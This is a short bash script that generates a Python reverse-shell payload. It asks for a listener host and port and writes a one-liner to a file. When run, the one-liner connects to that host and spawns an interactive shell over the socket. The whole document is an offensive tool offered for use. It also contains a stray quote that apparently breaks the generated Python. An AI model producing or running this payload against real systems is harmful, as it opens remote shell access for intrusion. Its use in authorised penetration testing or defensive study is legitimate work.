#!/bin/bash

read -p "[+] Enter LHOST : " LHOST
read -p "[+] Enter LPORT : " LPORT

echo "LHOST : $LHOST"
echo "LPORT : $LPORT"

echo """
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
""" >> /opt/wd-generated/python3shell.py
